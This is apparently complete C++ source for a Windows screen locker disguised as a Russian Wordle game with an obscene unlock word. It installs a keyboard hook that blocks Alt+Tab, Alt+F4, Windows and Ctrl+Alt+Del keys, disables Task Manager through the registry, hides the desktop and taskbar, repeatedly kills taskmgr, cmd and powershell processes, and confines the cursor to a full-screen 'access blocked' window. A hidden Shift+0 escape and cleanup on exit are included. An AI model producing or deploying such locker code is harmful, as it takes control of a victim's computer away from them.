#define UNICODE
#define _UNICODE

#include <windows.h>
#include <gdiplus.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <tlhelp32.h>

// Линковка библиотек
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace Gdiplus;

// --- КОНФИГУРАЦИЯ ---
const std::wstring SECRET_WORD = L"ПЕНИС"; // Загаданное слово
const int MAX_ATTEMPTS = 6;
// --------------------

// Глобальные переменные
HWND hMainWnd = NULL;
bool locked = true;
HHOOK hKeyboardHook = NULL;
ULONG_PTR gdiplusToken;

struct GuessRow {
    std::wstring letters;
    int colors[5]; // 0=None, 1=Gray, 2=Yellow, 3=Green
};
std::vector<GuessRow> guesses;
std::wstring currentInput = L"";
bool gameWon = false;
bool gameLost = false;

// --- БЛОКИРОВКА СИСТЕМЫ ---

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKbStruct->vkCode;

        // PANIC KEY: SHIFT + 0 (Аварийный выход)
        if (vkCode == '0' && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
            locked = false;
            PostQuitMessage(0);
            return 1;
        }

        // Блокировка системных клавиш
        if (vkCode == VK_LWIN || vkCode == VK_RWIN || vkCode == VK_APPS) return 1;
        if (vkCode == VK_TAB && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; // Alt+Tab
        if (vkCode == VK_ESCAPE && (GetAsyncKeyState(VK_CONTROL) & 0x8000)) return 1; // Ctrl+Esc
        if (vkCode == VK_F4 && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; // Alt+F4
        if (vkCode == VK_DELETE && (GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_MENU) & 0x8000)) return 1; // Ctrl+Alt+Del
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void KillProcessByName(const wchar_t* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
}

void SecureSystem() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
    ShowWindow(FindWindowW(L"Progman", NULL), SW_HIDE);
    ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_HIDE);
}

void UnlockSystem() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 0;
        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
    ShowWindow(FindWindowW(L"Progman", NULL), SW_SHOW);
    ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_SHOW);
}

void Watchdog() {
    while (locked) {
        KillProcessByName(L"taskmgr.exe");
        KillProcessByName(L"cmd.exe");
        KillProcessByName(L"powershell.exe");
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
}

// --- ЛОГИКА ИГРЫ ---

void CheckGuess() {
    if (currentInput.length() != 5) return;

    GuessRow newGuess;
    newGuess.letters = currentInput;
    std::wstring tempSecret = SECRET_WORD; 
    for(int i=0; i<5; i++) newGuess.colors[i] = 1; // Gray

    // Зеленые
    for (int i = 0; i < 5; i++) {
        if (newGuess.letters[i] == tempSecret[i]) {
            newGuess.colors[i] = 3;
            tempSecret[i] = L'*';
        }
    }
    // Желтые
    for (int i = 0; i < 5; i++) {
        if (newGuess.colors[i] == 3) continue;
        size_t foundPos = tempSecret.find(newGuess.letters[i]);
        if (foundPos != std::wstring::npos) {
            newGuess.colors[i] = 2;
            tempSecret[foundPos] = L'*';
        }
    }
    guesses.push_back(newGuess);

    if (currentInput == SECRET_WORD) {
        gameWon = true;
        std::thread([](){
            std::this_thread::sleep_for(std::chrono::seconds(2));
            locked = false;
            PostMessage(hMainWnd, WM_CLOSE, 0, 0);
        }).detach();
    } else if (guesses.size() >= MAX_ATTEMPTS) {
        gameLost = true;
        std::thread([](){
            std::this_thread::sleep_for(std::chrono::seconds(2));
            guesses.clear();
            currentInput = L"";
            gameLost = false;
            InvalidateRect(hMainWnd, NULL, FALSE);
        }).detach();
    }
    currentInput = L"";
}

// --- ОТРИСОВКА ---

void DrawScreen(HDC hdc, int width, int height) {
    Graphics graphics(hdc);
    graphics.SetTextRenderingHint(TextRenderingHintAntiAlias);

    // Темный фон
    SolidBrush bgBrush(Color(255, 15, 15, 20));
    graphics.FillRectangle(&bgBrush, 0, 0, width, height);

    // Шрифты с поддержкой кириллицы
    FontFamily fontFamily(L"Segoe UI"); // Стандартный системный шрифт
    Font fontHeader(&fontFamily, 36, FontStyleBold, UnitPixel);
    Font fontSub(&fontFamily, 20, FontStyleRegular, UnitPixel);
    Font fontLetter(&fontFamily, 32, FontStyleBold, UnitPixel);

    SolidBrush redBrush(Color(255, 255, 60, 60));
    SolidBrush whiteBrush(Color(255, 240, 240, 240));
    StringFormat centerFormat;
    centerFormat.SetAlignment(StringAlignmentCenter);

    // Текст
    graphics.DrawString(L"ДОСТУП ЗАБЛОКИРОВАН", -1, &fontHeader, PointF(width / 2.0f, 50.0f), &centerFormat, &redBrush);
    graphics.DrawString(L"Введите пароль, чтобы вернуть управление.\nПереключите язык на РУССКИЙ и вводите буквы.", -1, &fontSub, PointF(width / 2.0f, 100.0f), &centerFormat, &whiteBrush);

    // Сетка
    int boxSize = 60;
    int gap = 12;
    int startX = (width - (5 * boxSize + 4 * gap)) / 2;
    int startY = 220;
    Pen borderPen(Color(255, 100, 100, 100), 2);

    for (size_t r = 0; r < MAX_ATTEMPTS; r++) {
        for (int c = 0; c < 5; c++) {
            Rect rect(startX + c * (boxSize + gap), startY + r * (boxSize + gap), boxSize, boxSize);
            Color fillColor = Color(0, 0, 0, 0);
            wchar_t letter = 0;

            if (r < guesses.size()) {
                letter = guesses[r].letters[c];
                int col = guesses[r].colors[c];
                if (col == 1) fillColor = Color(255, 60, 60, 60); // Серый
                if (col == 2) fillColor = Color(255, 210, 180, 0); // Желтый
                if (col == 3) fillColor = Color(255, 0, 180, 0);   // Зеленый
            } else if (r == guesses.size() && c < currentInput.length()) {
                letter = currentInput[c];
                fillColor = Color(255, 40, 40, 45);
            }

            if (fillColor.GetAlpha() > 0) {
                SolidBrush fillBrush(fillColor);
                graphics.FillRectangle(&fillBrush, rect);
            }
            graphics.DrawRectangle(&borderPen, rect);

            if (letter != 0) {
                wchar_t s[2] = { letter, 0 };
                RectF rectF((REAL)rect.X, (REAL)rect.Y + 10, (REAL)rect.Width, (REAL)rect.Height);
                graphics.DrawString(s, -1, &fontLetter, rectF, &centerFormat, &whiteBrush);
            }
        }
    }

    if (gameWon) {
        SolidBrush greenBrush(Color(255, 0, 255, 0));
        graphics.DrawString(L"ПАРОЛЬ ПРИНЯТ. РАЗБЛОКИРОВКА...", -1, &fontHeader, PointF(width / 2.0f, height - 150.0f), &centerFormat, &greenBrush);
    } else if (gameLost) {
        graphics.DrawString(L"ОШИБКА ДОСТУПА. СБРОС ПОПЫТОК...", -1, &fontHeader, PointF(width / 2.0f, height - 150.0f), &centerFormat, &redBrush);
    }
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_CREATE:
        SetTimer(hWnd, 1, 100, NULL);
        return 0;

    case WM_TIMER:
        if (wParam == 1 && locked) {
            SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
            RECT rect;
            GetWindowRect(hWnd, &rect);
            ClipCursor(&rect);
            SetForegroundWindow(hWnd);
            SetFocus(hWnd);
        }
        return 0;

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        RECT rc;
        GetClientRect(hWnd, &rc);
        HDC memDC = CreateCompatibleDC(hdc);
        HBITMAP memBM = CreateCompatibleBitmap(hdc, rc.right, rc.bottom);
        SelectObject(memDC, memBM);
        DrawScreen(memDC, rc.right, rc.bottom);
        BitBlt(hdc, 0, 0, rc.right, rc.bottom, memDC, 0, 0, SRCCOPY);
        DeleteObject(memBM);
        DeleteDC(memDC);
        EndPaint(hWnd, &ps);
        return 0;
    }

    case WM_ERASEBKGND: return 1;

    case WM_CHAR: {
        if (!locked || gameWon || gameLost) break;
        wchar_t ch = (wchar_t)wParam;

        if (ch == VK_BACK) {
            if (!currentInput.empty()) {
                currentInput.pop_back();
                InvalidateRect(hWnd, NULL, FALSE);
            }
            return 0;
        }

        if (ch == VK_RETURN) {
            if (currentInput.length() == 5) {
                CheckGuess();
                InvalidateRect(hWnd, NULL, FALSE);
            }
            return 0;
        }

        // --- УЛУЧШЕННАЯ ОБРАБОТКА РУССКОГО ВВОДА ---
        // Преобразуем символ в верхний регистр средствами Windows
        CharUpperBuffW(&ch, 1);

        if (currentInput.length() < 5) {
            // Проверка диапазонов Unicode:
            // A-Z, А-Я (0410-042F), Ё (0401)
            bool isLatin = (ch >= 'A' && ch <= 'Z');
            bool isCyrillic = (ch >= 0x0410 && ch <= 0x044F) || (ch == 0x0401);

            if (isLatin || isCyrillic) {
                currentInput += ch;
                InvalidateRect(hWnd, NULL, FALSE);
            }
        }
        return 0;
    }

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hWnd, message, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    SecureSystem();
    std::thread watchdogThread(Watchdog);

    WNDCLASSW wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"RuLocker";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassW(&wc);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);
    
    hMainWnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, L"RuLocker", NULL,
        WS_POPUP | WS_VISIBLE, 0, 0, screenW, screenH, NULL, NULL, hInstance, NULL);

    // ShowCursor(FALSE); // Раскомментируй, чтобы скрыть мышь совсем

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    locked = false;
    watchdogThread.detach();
    UnlockSystem();
    if (hKeyboardHook) UnhookWindowsHookEx(hKeyboardHook);
    ClipCursor(NULL);
    GdiplusShutdown(gdiplusToken);

    return 0;
}
